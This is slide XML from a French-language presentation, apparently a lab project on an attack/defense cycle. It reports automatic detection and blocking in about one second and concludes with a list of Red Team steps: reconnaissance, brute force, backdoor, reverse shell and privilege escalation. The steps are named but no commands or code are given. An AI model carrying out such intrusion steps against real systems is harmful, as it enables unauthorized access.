            <a:endParaRPr sz="1150" b="0" i="0" u="none" strike="noStrike" cap="none">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="305" name="Google Shape;305;p16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6181344" y="1931835"/>
            <a:ext cx="5559552" cy="3301490"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2607"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F1F5F9"/>
          </a:solidFill>
          <a:ln w="22225" cap="flat" cmpd="sng">
            <a:solidFill>
              <a:srgbClr val="0E9E5E"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:round/>
            <a:headEnd type="none" w="sm" len="sm"/>
            <a:tailEnd type="none" w="sm" len="sm"/>
          </a:ln>
          <a:effectLst>
            <a:outerShdw blurRad="101600" dist="38100" dir="5400000" algn="bl" rotWithShape="0">
              <a:srgbClr val="000000">
                <a:alpha val="1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6" name="Google Shape;306;p16" descr="/sessions/intelligent-upbeat-noether/mnt/outputs/pptx_images/fig118_active_response_proof.png"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6181344" y="1931836"/>
            <a:ext cx="5559552" cy="3220204"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="307" name="Google Shape;307;p16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6181344" y="5233325"/>
            <a:ext cx="5559552" cy="29260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B6B7F"/>
              </a:buClr>
              <a:buSzPts val="1050"/>
              <a:buFont typeface="Calibri"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" b="0" i="1" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>111 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1050" b="0" i="1" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>événements</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1050" b="0" i="1" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> : </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1050" b="0" i="1" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>règle</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1050" b="0" i="1" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> 2501 (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1050" b="0" i="1" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>détection</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1050" b="0" i="1" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>) alternant avec 651 (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1050" b="0" i="1" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>blocage</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1050" b="0" i="1" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> auto)</a:t>
            </a:r>
            <a:endParaRPr sz="1050" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="308" name="Google Shape;308;p16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6263640" y="5566575"/>
            <a:ext cx="5394960" cy="822960"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 11111"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F1F5F9"/>
          </a:solidFill>
          <a:ln w="15875" cap="flat" cmpd="sng">
            <a:solidFill>
              <a:srgbClr val="0E9E5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16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6492240" y="5647860"/>
            <a:ext cx="4937760" cy="82296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9E5E"/>
              </a:buClr>
              <a:buSzPts val="1250"/>
              <a:buFont typeface="Calibri"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0E9E5E"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>Détection</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1250" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0E9E5E"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> → </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1250" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0E9E5E"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>réponse</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1250" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0E9E5E"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> active → </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1250" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0E9E5E"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>blocage</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1250" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0E9E5E"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> : ~1 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1250" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0E9E5E"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>seconde</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1250" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0E9E5E"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>, sans </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1250" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0E9E5E"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>aucune</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1250" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0E9E5E"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> intervention humaine.</a:t>
            </a:r>
            <a:endParaRPr sz="1250" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="310" name="Google Shape;310;p16"/>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dirty="0">
                <a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>16</a:t>
            </a:r>
            <a:endParaRPr sz="1000" b="0" i="0" u="none" strike="noStrike" cap="none"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8"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="7" dur="1000"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="298"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="8" dur="1000" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="298"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="9" dur="1000" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="29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99"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="12" dur="1000"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="299"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="13" dur="1000" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="299"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="14" dur="1000" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="29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05"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="17" dur="1000"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="305"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="18" dur="1000" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="305"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="19" dur="1000" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="30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06"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="22" dur="1000"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="306"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="23" dur="1000" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="306"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="24" dur="1000" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="30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07"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="27" dur="1000"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="307"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="28" dur="1000" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="307"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="29" dur="1000" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="30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00"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="32" dur="1000"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="300"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="33" dur="1000" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="300"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="34" dur="1000" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="3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 grpId="0" animBg="1"/>
      <p:bldP spid="300" grpId="0"/>
      <p:bldP spid="305" grpId="0" animBg="1"/>
      <p:bldP spid="307"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8"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="339" name="Google Shape;339;p18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="384048"/>
            <a:ext cx="10058400" cy="2926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86C0"/>
              </a:buClr>
              <a:buSzPts val="1300"/>
              <a:buFont typeface="Calibri"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0E86C0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>05 · CONCLUSION</a:t>
            </a:r>
            <a:endParaRPr sz="1300" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="340" name="Google Shape;340;p18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="676656"/>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2700"/>
              <a:buFont typeface="Cambria"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2700" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Cambria"/>
                <a:ea typeface="Cambria"/>
                <a:cs typeface="Cambria"/>
                <a:sym typeface="Cambria"/>
              </a:rPr>
              <a:t>Un cycle </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2700" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Cambria"/>
                <a:ea typeface="Cambria"/>
                <a:cs typeface="Cambria"/>
                <a:sym typeface="Cambria"/>
              </a:rPr>
              <a:t>attaque</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2700" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Cambria"/>
                <a:ea typeface="Cambria"/>
                <a:cs typeface="Cambria"/>
                <a:sym typeface="Cambria"/>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2700" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Cambria"/>
                <a:ea typeface="Cambria"/>
                <a:cs typeface="Cambria"/>
                <a:sym typeface="Cambria"/>
              </a:rPr>
              <a:t>défense</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2700" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Cambria"/>
                <a:ea typeface="Cambria"/>
                <a:cs typeface="Cambria"/>
                <a:sym typeface="Cambria"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2700" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Cambria"/>
                <a:ea typeface="Cambria"/>
                <a:cs typeface="Cambria"/>
                <a:sym typeface="Cambria"/>
              </a:rPr>
              <a:t>complet</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2700" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Cambria"/>
                <a:ea typeface="Cambria"/>
                <a:cs typeface="Cambria"/>
                <a:sym typeface="Cambria"/>
              </a:rPr>
              <a:t> et </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2700" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Cambria"/>
                <a:ea typeface="Cambria"/>
                <a:cs typeface="Cambria"/>
                <a:sym typeface="Cambria"/>
              </a:rPr>
              <a:t>validé</a:t>
            </a:r>
            <a:endParaRPr sz="2700" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="341" name="Google Shape;341;p18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1463040"/>
            <a:ext cx="10972800" cy="4114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33333"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="0F172A"/>
              </a:buClr>
              <a:buSzPts val="1500"/>
              <a:buFont typeface="Calibri"/>
              <a:buChar char="–"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>Scénario</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> Red Team </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>complet</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> : reconnaissance, brute force, backdoor, reverse shell, escalade de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>privilèges</a:t>
            </a:r>
            <a:endParaRPr sz="1500" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="228600" marR="0" lvl="0" indent="-228600" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="133333"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1200"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="0F172A"/>
              </a:buClr>
              <a:buSzPts val="1500"/>
              <a:buFont typeface="Calibri"/>
